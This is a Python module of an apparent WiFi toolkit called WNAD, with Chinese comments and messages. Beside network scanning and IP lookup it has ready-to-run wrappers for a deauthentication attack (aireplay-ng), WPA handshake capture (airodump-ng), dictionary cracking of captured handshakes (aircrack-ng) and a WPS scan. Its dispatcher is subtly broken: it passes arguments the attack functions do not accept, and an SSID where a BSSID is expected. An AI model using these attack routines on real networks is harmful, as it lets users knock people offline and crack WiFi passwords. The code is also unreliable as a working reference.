"""
WNAD - WiFi 工具模块
扫描、信息查询、攻击、破解一体化
支持 RT3070L 网卡 | 部分功能需要 root
"""

import os
import sys
import re
import time
import socket
import subprocess
import threading
from datetime import datetime
from core.utils import C, CHECK, CROSS, INFO, ROOT, WARN, ARROW, print_table
from core.network import get_oui_vendor, get_gateway
from core.root_check import require_root_graceful


WNAD_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DICTS_DIR = os.path.join(WNAD_ROOT, "data", "dicts")


# ── 辅助函数 ──

def _run_cmd(cmd: list, timeout: int = 10) -> tuple:
    """运行命令，返回 (rc, stdout, stderr)"""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except FileNotFoundError:
        return -1, "", "command not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except Exception as e:
        return -1, "", str(e)


def _get_wifi_iface() -> str:
    """自动检测 WiFi 网卡，跨平台"""
    from core.utils import is_windows

    # Windows: 用 PowerShell 检测 Wi-Fi 适配器
    if is_windows():
        try:
            result = subprocess.run(
                ["powershell", "-Command",
                 "Get-NetAdapter | Where-Object {$_.InterfaceDescription -match 'Wireless|WiFi|WLAN|802.11'} | Select-Object -ExpandProperty Name"],
                capture_output=True, text=True, timeout=10,
                encoding="utf-8", errors="replace"
            )
            if result.returncode == 0:
                name = result.stdout.strip()
                if name:
                    return name
        except Exception:
            pass
        # Windows 上使用 netsh wlan 不需要指定接口名
        return ""

    # Linux / Android
    try:
        result = subprocess.run(
            ["iwconfig"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            for line in result.stdout.split("\n"):
                m = re.match(r'^(\S+)\s+', line)
                if m:
                    ifname = m.group(1)
                    if ifname != "lo":
                        return ifname
    except Exception:
        pass

    # 尝试常见名称
    for name in ["wlan0", "wlan1", "wlp2s0", "wlx00c0ca"]:
        rc, out, _ = _run_cmd(["iwconfig", name])
        if rc == 0:
            return name
    return "wlan0"


def _dbm_to_pct(dbm: int) -> int:
    """信号 dBm 转为百分比"""
    if dbm >= -30:
        return 100
    if dbm <= -100:
        return 0
    return int((dbm + 100) * 1.5)


# ═══════════════════════════════════════════════
#  1. wnaw wifi -l  — 列出周围网络
# ═══════════════════════════════════════════════

def wifi_scan_list(iface: str = None, show_all: bool = False):
    """
    扫描周围 WiFi 网络并列出
    尝试多种方法，无需 root
    """
    from core.utils import is_windows

    if not iface:
        iface = _get_wifi_iface()

    if iface:
        print(f" {INFO} 扫描周围 WiFi 网络 (接口: {C.CYAN}{iface}{C.NC})")
    else:
        print(f" {INFO} 扫描周围 WiFi 网络...")
    print(f" {INFO} 需要 5-10 秒...\n")

    aps = []
    current = {}

    # Windows 专用: netsh wlan show networks
    if is_windows():
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                capture_output=True, text=True, timeout=20,
                encoding="utf-8", errors="replace"
            )
            if result.returncode == 0 and result.stdout.strip():
                current = {}
                ssid_name = ""
                for line in result.stdout.split("\n"):
                    line = line.strip()
                    # SSID 行
                    ssid_m = re.match(r'^SSID\s+\d+\s*:\s*(.+)$', line)
                    if ssid_m:
                        if current:
                            aps.append(current)
                        ssid_name = ssid_m.group(1).strip()
                        current = {"ssid": ssid_name, "bssid": "?", "signal": -100,
                                   "channel": "?", "encryption": "?", "security": "?"}
                        continue
                    # BSSID
                    bssid_m = re.search(r'BSSID\s*\d+\s*:\s*([0-9a-fA-F:\-]{17})', line)
                    if bssid_m and current:
                        current["bssid"] = bssid_m.group(1).replace("-", ":").upper()
                    # 信号
                    sig_m = re.search(r'信号\s*:\s*(-?\d+)%', line)
                    if not sig_m:
                        sig_m = re.search(r'Signal\s*:\s*(-?\d+)%', line)
                    if sig_m and current:
                        # netsh 返回百分比，转为 dBm 近似值
                        pct = int(sig_m.group(1))
                        current["signal"] = int((pct / 1.5) - 100)
                    # 信道
                    ch_m = re.search(r'信道\s*:\s*(\d+)', line)
                    if not ch_m:
                        ch_m = re.search(r'Channel\s*:\s*(\d+)', line)
                    if ch_m and current:
                        current["channel"] = ch_m.group(1)
                    # 加密
                    enc_m = re.search(r'身份验证\s*:\s*(\S+)', line)
                    if not enc_m:
                        enc_m = re.search(r'Authentication\s*:\s*(\S+)', line)
                    if enc_m and current:
                        auth = enc_m.group(1)
                        if auth.upper() == "OPEN":
                            current["encryption"] = "none"
                        elif "WPA3" in auth:
                            current["encryption"] = "WPA3"
                        elif "WPA2" in auth:
                            current["encryption"] = "WPA2"
                        elif "WPA" in auth:
                            current["encryption"] = "WPA"
                        else:
                            current["encryption"] = auth

                if current:
                    aps.append(current)

                if aps:
                    # 跳到去重输出
                    pass
        except Exception:
            pass

    if not aps:
        # Linux/Android: 通过 iw / iwlist 扫描
        if iface:
            # 方法1: iw dev scan
            rc, out, _ = _run_cmd(["iw", "dev", iface, "scan"], timeout=15)
            if rc == 0 and out:
                current = {}
                for line in out.split("\n"):
                    bssid_m = re.search(r'BSS\s+([0-9a-fA-F:]{17})', line)
                    if bssid_m:
                        if current:
                            aps.append(current)
                        current = {"bssid": bssid_m.group(1).upper(), "ssid": "?", "signal": -100,
                                   "channel": "?", "encryption": "?", "security": "?"}
                        continue
                    ssid_m = re.search(r'SSID:\s*(.*)', line)
                    if ssid_m and current:
                        current["ssid"] = ssid_m.group(1).strip() or "(hidden)"
                    sig_m = re.search(r'signal:\s*(-?\d+)', line)
                    if sig_m and current:
                        current["signal"] = int(sig_m.group(1))
                    freq_m = re.search(r'freq:\s*(\d+)', line)
                    if freq_m and current:
                        freq = int(freq_m.group(1))
                        current["channel"] = str((freq - 2412) // 5 + 1) if 2412 <= freq <= 2484 else \
                                             str((freq - 5180) // 5 + 36) if 5170 <= freq <= 5825 else f"{freq}MHz"
                    if "Group cipher" in line and current:
                        current["encryption"] = "WPA3" if "SAE" in line else ("WPA2" if "CCMP" in line else "WEP")
                    if "RSN:" in line and current and current["encryption"] == "?":
                        current["encryption"] = "WPA2"
                    if current and current.get("encryption") == "?" and "capability: 0x" in line:
                        cap_m = re.search(r'capability:\s*(0x[0-9a-f]+)', line)
                        if cap_m and (int(cap_m.group(1), 16) & 0x10):
                            current["encryption"] = "WEP"
                if current:
                    aps.append(current)

            if not aps:
                # 方法2: iwlist scan（Linux 兼容）
                rc, out, _ = _run_cmd(["iwlist", iface, "scan"], timeout=15)
                if rc == 0:
                    current = {}
                    for line in out.split("\n"):
                        bssid_m = re.search(r'Cell\s+\d+\s+-\s+Address:\s*([0-9a-fA-F:]{17})', line)
                        if bssid_m:
                            if current:
                                aps.append(current)
                            current = {"bssid": bssid_m.group(1).upper(), "ssid": "?", "signal": -100,
                                       "channel": "?", "encryption": "?", "security": "?"}
                            continue
                        ssid_m = re.search(r'ESSID:"(.*)"', line)
                        if ssid_m and current:
                            current["ssid"] = ssid_m.group(1) or "(hidden)"
                        sig_m = re.search(r'Signal level[=:]\s*(-?\d+)', line)
                        if sig_m and current:
                            current["signal"] = int(sig_m.group(1))
                        ch_m = re.search(r'Channel\s*(\d+)', line)
                        if ch_m and current:
                            current["channel"] = ch_m.group(1)
                        enc_m = re.search(r'Encryption key[=:](\S+)', line)
                        if enc_m and current:
                            current["encryption"] = "on" if enc_m.group(1) != "off" else "none"
                    if current:
                        aps.append(current)

    if not aps:
        print(f" {WARN} 未检测到 WiFi 网络")
        from core.utils import is_windows
        if is_windows():
            print(f" {INFO} 当前系统无 WiFi 适配器或 WiFi 未开启")
        else:
            print(f" {INFO} 可能原因: 接口 {iface} 不在 managed 模式，或无 WiFi 网卡")
        # 回退：显示当前网络连接信息
        print()
        wifi_ip()
        return

    # 去重: SSID + BSSID
    seen = set()
    unique_aps = []
    for ap in sorted(aps, key=lambda x: x.get("signal", -100), reverse=True):
        key = (ap["ssid"], ap["bssid"])
        if key not in seen:
            seen.add(key)
            unique_aps.append(ap)

    # 判断是否加密
    for ap in unique_aps:
        enc = ap.get("encryption", "?")
        if enc in ("?", "none", "off", "NONE"):
            ap["has_pwd"] = "N"
            ap["enc_icon"] = f"{C.GREEN}OPEN{C.NC}"
        else:
            ap["has_pwd"] = "Y"
            ap["enc_icon"] = f"{C.RED}{enc}{C.NC}"

    print(f" {CHECK} 发现 {len(unique_aps)} 个网络:\n")

    rows = []
    for i, ap in enumerate(unique_aps):
        sig = ap.get("signal", 0)
        pct = _dbm_to_pct(sig)
        sig_bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        ssid = ap.get("ssid", "?")

        # 高亮当前连接
        if ssid != "?" and ssid != "(hidden)":
            rows.append([
                str(i + 1),
                ssid[:22],
                ap.get("bssid", "?")[:17],
                f"{sig}dBm {sig_bar}",
                f"CH {ap.get('channel', '?')}",
                ap["enc_icon"],
            ])

    print_table(["#", "SSID", "BSSID", "信号", "信道", "加密"], rows)

    print(f"\n {INFO} 图例: {C.GREEN}OPEN{C.NC}=无密码  {C.RED}WPA2{C.NC}=有密码  {C.RED}WPA3{C.NC}=最新加密")


# ── 实时监控 (airodump-ng 风格) ──

def _scan_once(iface: str) -> list:
    """单次扫描，返回 AP 列表 [{bssid, ssid, signal, channel, enc}]"""
    from core.utils import is_windows
    aps = []

    if is_windows():
        try:
            r = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"],
                               capture_output=True, text=True, timeout=20,
                               encoding="utf-8", errors="replace")
            if r.returncode == 0:
                cur = {}
                for line in r.stdout.split("\n"):
                    s = re.search(r'^SSID\s+\d+\s*:\s*(.+)', line)
                    if s:
                        if cur: aps.append(cur)
                        cur = {"ssid": s.group(1).strip(), "bssid": "?", "signal": -100, "channel": "?", "enc": "?", "first_seen": time.time()}
                    b = re.search(r'BSSID\s*\d+\s*:\s*([0-9a-fA-F:\-]{17})', line)
                    if b and cur: cur["bssid"] = b.group(1).replace("-", ":").upper()
                    p = re.search(r'(?:信号|Signal)\s*:\s*(-?\d+)%', line)
                    if p and cur: cur["signal"] = int((int(p.group(1)) / 1.5) - 100)
                    c = re.search(r'(?:信道|Channel)\s*:\s*(\d+)', line)
                    if c and cur: cur["channel"] = c.group(1)
                    e = re.search(r'(?:身份验证|Authentication)\s*:\s*(\S+)', line)
                    if e and cur:
                        a = e.group(1).upper()
                        cur["enc"] = "OPEN" if a == "OPEN" else "WPA3" if "WPA3" in a else "WPA2" if "WPA2" in a else a
                if cur: aps.append(cur)
        except Exception:
            pass
    else:
        rc, out, _ = _run_cmd(["iw", "dev", iface, "scan"], timeout=15)
        if rc == 0 and out:
            cur = {}
            for line in out.split("\n"):
                b = re.search(r'BSS\s+([0-9a-fA-F:]{17})', line)
                if b:
                    if cur: aps.append(cur)
                    cur = {"bssid": b.group(1).upper(), "ssid": "?", "signal": -100, "channel": "?", "enc": "?", "first_seen": time.time()}
                s = re.search(r'SSID:\s*(.*)', line)
                if s and cur: cur["ssid"] = s.group(1).strip() or "(hidden)"
                p = re.search(r'signal:\s*(-?\d+)', line)
                if p and cur: cur["signal"] = int(p.group(1))
                f = re.search(r'freq:\s*(\d+)', line)
                if f and cur:
                    fv = int(f.group(1))
                    cur["channel"] = str((fv - 2412)//5 + 1) if 2412 <= fv <= 2484 else str((fv - 5180)//5 + 36) if 5170 <= fv <= 5825 else f"{fv}MHz"
                if "Group cipher" in line and cur:
                    cur["enc"] = "WPA3" if "SAE" in line else ("WPA2" if "CCMP" in line else "WEP")
                if "RSN:" in line and cur and cur["enc"] == "?":
                    cur["enc"] = "WPA2"
            if cur: aps.append(cur)
        else:
            rc, out, _ = _run_cmd(["iwlist", iface, "scan"], timeout=15)
            if rc == 0:
                cur = {}
                for line in out.split("\n"):
                    b = re.search(r'Cell\s+\d+\s+-\s+Address:\s*([0-9a-fA-F:]{17})', line)
                    if b:
                        if cur: aps.append(cur)
                        cur = {"bssid": b.group(1).upper(), "ssid": "?", "signal": -100, "channel": "?", "enc": "?", "first_seen": time.time()}
                    s = re.search(r'ESSID:"(.*)"', line)
                    if s and cur: cur["ssid"] = s.group(1) or "(hidden)"
                    p = re.search(r'Signal level[=:]\s*(-?\d+)', line)
                    if p and cur: cur["signal"] = int(p.group(1))
                    c = re.search(r'Channel\s*(\d+)', line)
                    if c and cur: cur["channel"] = c.group(1)
                    e = re.search(r'Encryption key[=:](\S+)', line)
                    if e and cur: cur["enc"] = "OPEN" if e.group(1) == "off" else "WPA2"
                if cur: aps.append(cur)
    return aps


def _sig_bar(dbm: int) -> str:
    """dBm 转信号条"""
    pct = max(0, min(100, int((dbm + 100) * 1.5)))
    filled = pct // 10
    return "█" * filled + "░" * (10 - filled)


def wifi_monitor(iface: str = None, interval: float = 3.0):
    """
    实时 WiFi 监控 (类 airodump-ng)
    持续扫描并刷新显示，Ctrl+C 停止
    """
    if not iface:
        iface = _get_wifi_iface()

    seen = {}
    try:
        while True:
            aps = _scan_once(iface)
            now = time.time()

            for ap in aps:
                bssid = ap["bssid"]
                if bssid in seen:
                    seen[bssid]["signal"] = ap["signal"]
                    seen[bssid]["channel"] = ap["channel"]
                    seen[bssid]["enc"] = ap["enc"]
                    seen[bssid]["last_seen"] = now
                else:
                    ap["first_seen"] = now
                    ap["last_seen"] = now
                    seen[bssid] = ap

            stale = [b for b, a in seen.items() if now - a["last_seen"] > 60]
            for b in stale:
                del seen[b]

            # 渲染
            sys.stdout.write("\033[H\033[J")
            header = (
                f" {C.BOLD}{'BSSID':<19}{'Signal':<24}{'CH':<5}{'Enc':<8}{'SSID'}{C.NC}"
            )
            print(header)
            print(f" {C.DIM}{'─'*80}{C.NC}")

            for ap in sorted(seen.values(), key=lambda x: x.get("signal", -100), reverse=True):
                bssid = ap["bssid"]
                sig = ap.get("signal", -100)
                bar = _sig_bar(sig)
                ch = ap.get("channel", "?")
                enc = ap.get("enc", "?")
                ssid = ap.get("ssid", "?")
                age = now - ap.get("first_seen", now)

                enc_color = C.GREEN if enc == "OPEN" else (C.RED if enc in ("WPA3", "WPA2") else C.YELLOW)
                marker = C.GREEN + "[+]" + C.NC if age < 30 else "   "

                print(
                    f" {marker} {bssid:<19}"
                    f"{sig:>4}dBm {bar:<14}"
                    f"{ch:<5}"
                    f"{enc_color}{enc:<8}{C.NC}"
                    f"{ssid[:28]}"
                )

            print(f"\n {C.DIM}APs: {len(seen)}  |  refresh: {interval}s  |  Ctrl+C to stop{C.NC}")
            sys.stdout.flush()
            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n {CHECK} 监控已停止")



def wifi_info(ssid: str):
    """显示特定 WiFi 网络的详细信息"""
    if not ssid:
        print(f" {CROSS} 请指定网络名称 (--name)")
        return

    print(f" {INFO} 查找: {C.CYAN}{ssid}{C.NC}\n")

    # 先扫描获取该网络信息
    iface = _get_wifi_iface()
    rc, out, _ = _run_cmd(["iw", "dev", iface, "scan"], timeout=15)
    if rc != 0:
        rc, out, _ = _run_cmd(["iwlist", iface, "scan"], timeout=15)

    if rc != 0:
        print(f" {CROSS} 无法扫描 WiFi")
        return

    found = None
    current = {}
    for line in out.split("\n"):
        bssid_m = re.search(r'BSS\s+([0-9a-fA-F:]{17})', line)
        if bssid_m:
            if current and current.get("ssid", "").lower() == ssid.lower():
                found = current
                break
            current = {"bssid": bssid_m.group(1).upper()}
            continue
        for key, pattern in [
            ("ssid", r'SSID:\s*(.*)'),
            ("signal", r'signal:\s*(-?\d+)'),
            ("freq", r'freq:\s*(\d+)'),
            ("beacon", r'last beacon:\s*(\d+)ms'),
            ("capability", r'capability:\s*(0x[0-9a-f]+)'),
        ]:
            m = re.search(pattern, line)
            if m and key not in current:
                current[key] = m.group(1) if key != "signal" else int(m.group(1))

    if not found:
        print(f" {CROSS} 未找到网络: {ssid}")
        print(f" {INFO} 请先运行 {C.CYAN}wnad wifi -l{C.NC} 查看可用网络")
        return

    sig = found.get("signal", 0)
    pct = _dbm_to_pct(sig)

    rows = [
        ("SSID", found.get("ssid", "?")),
        ("BSSID", found.get("bssid", "?")),
        ("信号", f"{sig} dBm ({pct}%)"),
        ("信道", found.get("channel", "?")),
        ("厂商", get_oui_vendor(found.get("bssid", ""))),
    ]
    print_table(["属性", "值"], rows)


# ═══════════════════════════════════════════════
#  3. wnaw wifi --name <SSID> --ip  — 网络 IP
# ═══════════════════════════════════════════════

def wifi_ip(ssid: str = None):
    """
    显示当前连接网络的 IP 信息
    或指定 SSID 所在网段
    """
    from core.network import get_gateway, get_dns_servers
    from core.iplookup import lookup_public
    from core.utils import is_windows

    print(f" {INFO} 网络 IP 信息:\n")

    # 获取本机 IP
    local_ip = "?"
    netmask = "?"
    iface = _get_wifi_iface()

    if is_windows() and not iface:
        # Windows 无 WiFi 时，从所有 UP 接口获取第一个 IPv4
        try:
            result = subprocess.run(
                ["powershell", "-Command",
                 "Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -ne 'Loopback'} | Select-Object IPAddress, PrefixLength, InterfaceAlias | ConvertTo-Json"],
                capture_output=True, text=True, timeout=10,
                encoding="utf-8", errors="replace"
            )
            if result.returncode == 0 and result.stdout.strip():
                import json
                data = json.loads(result.stdout.strip())
                if isinstance(data, list) and data:
                    data = data[0]
                if isinstance(data, dict):
                    local_ip = data.get("IPAddress", "?")
                    prefix = data.get("PrefixLength", 24)
                    mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
                    netmask = ".".join(str((mask >> (24 - i * 8)) & 0xFF) for i in range(4))
                    iface = data.get("InterfaceAlias", iface)
        except Exception:
            pass
    else:
        # Linux / Android
        rc, out, _ = _run_cmd(["ip", "-4", "addr", "show", iface] if iface else ["ip", "-4", "addr", "show"])
        if rc == 0:
            m = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)', out)
            if m:
                local_ip = m.group(1)
                prefix = int(m.group(2))
                mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
                netmask = ".".join(str((mask >> (24 - i * 8)) & 0xFF) for i in range(4))

    gw = get_gateway()
    dns = get_dns_servers()

    rows = [
        ("接口", iface),
        ("本机 IP", local_ip),
        ("子网掩码", netmask),
        ("网关", gw),
        ("DNS", ", ".join(dns) if dns else "?"),
    ]

    print_table(["属性", "值"], rows)
    print()

    # 显示当前 Wi-Fi 信息
    from core.network import get_wifi_info
    wifi_info = get_wifi_info()
    if wifi_info["ssid"] != "未知":
        print(f" {CHECK} 当前连接: {C.CYAN}{wifi_info['ssid']}{C.NC}")
        if wifi_info["signal"] != "未知":
            print(f" {INFO} 信号: {wifi_info['signal']}")

    # 查询公网 IP
    print()
    lookup_public()


# ═══════════════════════════════════════════════
#  4. wnaw wifi --name <SSID> --deauth  — 断连攻击
# ═══════════════════════════════════════════════

def wifi_deauth(target_bssid: str = None, iface: str = None, count: int = 5):
    """
    [ROOT] Deauth 攻击
    向目标 AP 发送 802.11 取消认证帧
    需要监控模式 + root
    """
    root = require_root_graceful("Deauth 攻击", "无非 root 替代方案")
    if root is not True:
        return

    if not target_bssid:
        print(f" {CROSS} 请指定目标 BSSID")
        print(f" {INFO} 请先运行 {C.CYAN}wnad wifi -l{C.NC} 获取 BSSID")
        return

    if not iface:
        iface = _get_wifi_iface()

    print(f" {ROOT} {C.RED}Deauth 攻击{C.NC}")
    print(f" {INFO} 目标: {C.CYAN}{target_bssid}{C.NC}")
    print(f" {INFO} 接口: {C.CYAN}{iface}{C.NC}")
    print(f" {INFO} 次数: {count} 轮 (每轮 64 包)")
    print(f" {WARN} 仅用于合法授权的自有网络测试!\n")

    # 检查 aireplay-ng
    rc, _, _ = _run_cmd(["which", "aireplay-ng"])
    if rc != 0:
        # 使用 mdk3 / mdk4 或 Python 实现
        rc, _, _ = _run_cmd(["which", "mdk4"])
        if rc != 0:
            print(f" {CROSS} 未安装攻击工具")
            print(f" {INFO} 安装: {C.YELLOW}pkg install aircrack-ng{C.NC}")
            print(f" {INFO} 或:   {C.YELLOW}pkg install mdk4{C.NC}")
            return

    try:
        for i in range(count):
            print(f" {INFO} 第 {i+1}/{count} 轮...")
            subprocess.run(
                ["aireplay-ng", "-0", "1", "-a", target_bssid, iface],
                capture_output=True, timeout=30
            )
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n {INFO} 用户中断")

    print(f" {CHECK} Deauth 攻击完成")


# ═══════════════════════════════════════════════
#  5. wnaw wifi --name <SSID> --handshake  — 握手包
# ═══════════════════════════════════════════════

def wifi_handshake(target_bssid: str, target_channel: str = None,
                   iface: str = None, output: str = None):
    """
    [ROOT] 捕获 WPA 四次握手包
    需要监控模式 + root + airodump-ng
    """
    root = require_root_graceful("捕获握手包", "无非 root 替代方案")
    if root is not True:
        return

    if not target_bssid:
        print(f" {CROSS} 请指定目标 BSSID")
        return

    if not iface:
        iface = _get_wifi_iface()

    if not output:
        output_dir = os.environ.get("WNAD_DATA", "/tmp")
        output = os.path.join(output_dir, f"handshake_{datetime.now().strftime('%Y%m%d_%H%M%S')}")

    # 检查 airodump-ng
    rc, _, _ = _run_cmd(["which", "airodump-ng"])
    if rc != 0:
        print(f" {CROSS} 未安装 airodump-ng")
        print(f" {INFO} 安装: {C.YELLOW}pkg install aircrack-ng{C.NC}")
        return

    print(f" {ROOT} {C.RED}捕获 WPA 握手包{C.NC}")
    print(f" {INFO} 目标: {C.CYAN}{target_bssid}{C.NC}")
    print(f" {INFO} 接口: {C.CYAN}{iface}{C.NC}")
    print(f" {INFO} 输出: {output}.cap")
    print(f" {INFO} 按 Ctrl+C 停止捕获")

    if target_channel:
        print(f" {INFO} 锁定信道: {target_channel}")

    print()

    try:
        cmd = ["airodump-ng", "-c", target_channel, "--bssid", target_bssid,
               "-w", output, iface] if target_channel else \
              ["airodump-ng", "--bssid", target_bssid, "-w", output, iface]
        proc = subprocess.Popen(cmd)
        proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        print(f"\n {CHECK} 捕获已停止")

    cap_file = f"{output}.cap"
    if os.path.isfile(cap_file):
        size = os.path.getsize(cap_file)
        print(f" {CHECK} 抓取完成: {cap_file} ({size} bytes)")
        return cap_file
    else:
        print(f" {CROSS} 未捕获到数据")
        return None


# ═══════════════════════════════════════════════
#  6. wnaw wifi --name <SSID> --crack  — 密码破解
# ═══════════════════════════════════════════════

def list_dicts():
    """列出可用的字典"""
    if not os.path.isdir(DICTS_DIR):
        print(f" {CROSS} 字典目录不存在: {DICTS_DIR}")
        return

    dicts = sorted(f for f in os.listdir(DICTS_DIR) if f.endswith(".txt"))
    if not dicts:
        print(f" {INFO} 未找到字典文件")
        print(f" {INFO} 请将字典 (.txt) 放入: {C.CYAN}{DICTS_DIR}{C.NC}")
        return

    print(f" {CHECK} 可用字典 ({len(dicts)} 个):\n")
    rows = []
    for d in dicts:
        path = os.path.join(DICTS_DIR, d)
        size = os.path.getsize(path)
        with open(path, encoding="utf-8", errors="ignore") as f:
            line_count = sum(1 for l in f if l.strip() and not l.startswith("#"))
        rows.append([d, f"{size:,} bytes", f"{line_count:,} 条"])

    print_table(["文件名", "大小", "密码数"], rows)
    print(f"\n {INFO} 下载更多字典:")
    print(f"   常用:   https://github.com/brannondorsey/naive-hashcat/releases")
    print(f"   rockyou: https://github.com/praetorian/stego-toolkit")


def wifi_crack(handshake_file: str, dict_name: str = "common.txt", bssid: str = None):
    """
    [ROOT] 使用 aircrack-ng 破解 WPA 握手包
    """
    root = require_root_graceful("WPA 破解", "无非 root 替代方案")
    if root is not True:
        return

    if not os.path.isfile(handshake_file):
        print(f" {CROSS} 握手包文件不存在: {handshake_file}")
        print(f" {INFO} 请先使用 {C.CYAN}--handshake{C.NC} 捕获握手包")
        return

    dict_path = os.path.join(DICTS_DIR, dict_name)
    if not os.path.isfile(dict_path):
        print(f" {CROSS} 字典不存在: {dict_name}")
        print(f" {INFO} 查看可用字典: {C.CYAN}wnad wifi --dict{C.NC}")
        return

    # 检查 aircrack-ng
    rc, _, _ = _run_cmd(["which", "aircrack-ng"])
    if rc != 0:
        print(f" {CROSS} 未安装 aircrack-ng")
        print(f" {INFO} 安装: {C.YELLOW}pkg install aircrack-ng{C.NC}")
        return

    # 统计字典行数
    with open(dict_path, encoding="utf-8", errors="ignore") as f:
        total = sum(1 for l in f if l.strip() and not l.startswith("#"))

    print(f" {ROOT} {C.RED}WPA 握手包破解{C.NC}")
    print(f" {INFO} 文件: {handshake_file}")
    print(f" {INFO} 字典: {dict_name} ({total:,} 条)")
    if bssid:
        print(f" {INFO} BSSID: {bssid}")
    print(f" {INFO} 按 Ctrl+C 跳过当前密码\n")

    try:
        cmd = ["aircrack-ng", "-w", dict_path, handshake_file]
        if bssid:
            cmd += ["--bssid", bssid]
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n {INFO} 用户中断")


# ═══════════════════════════════════════════════
#  7. wnaw wifi --name <SSID> --wps  — WPS 信息
# ═══════════════════════════════════════════════

def wifi_wps(iface: str = None):
    """
    扫描支持 WPS 的 AP（需要 root + wash 工具）
    """
    root = require_root_graceful("WPS 扫描", "无非 root 替代方案")
    if root is not True:
        return

    if not iface:
        iface = _get_wifi_iface()

    rc, _, _ = _run_cmd(["which", "wash"])
    if rc != 0:
        print(f" {CROSS} 未安装 wash (reaver)")
        print(f" {INFO} 安装: {C.YELLOW}pkg install reaver{C.NC}")
        return

    print(f" {ROOT} {C.RED}WPS 扫描{C.NC}")
    print(f" {INFO} 接口: {C.CYAN}{iface}{C.NC}")
    print(f" {INFO} 扫描支持 WPS 的 AP...\n")

    try:
        subprocess.run(["wash", "-i", iface])
    except KeyboardInterrupt:
        print(f"\n {INFO} 用户中断")


# ═══════════════════════════════════════════════
#  8. Main dispatcher
# ═══════════════════════════════════════════════

def wifi_main(args):
    """wifi 命令主分发"""
    if hasattr(args, 'monitor') and args.monitor:
        wifi_monitor(interval=args.interval if hasattr(args, 'interval') else 3.0)
    elif hasattr(args, 'list_networks') and args.list_networks:
        wifi_scan_list()
    elif hasattr(args, 'dict_list') and args.dict_list:
        list_dicts()
    elif hasattr(args, 'wps') and args.wps:
        wifi_wps()
    elif hasattr(args, 'name') and args.name:
        ssid = args.name
        if hasattr(args, 'info') and args.info:
            wifi_info(ssid)
        elif hasattr(args, 'ip') and args.ip:
            wifi_ip(ssid)
        elif hasattr(args, 'deauth') and args.deauth:
            wifi_deauth(args.deauth, bssid=args.bssid)
        elif hasattr(args, 'handshake') and args.handshake:
            wifi_handshake(ssid, target_channel=args.channel)
        elif hasattr(args, 'crack') and args.crack:
            wifi_crack(args.crack, dict_name=args.dict or "common.txt")
        else:
            wifi_info(ssid)
    else:
        # 默认显示周围网络
        wifi_scan_list()
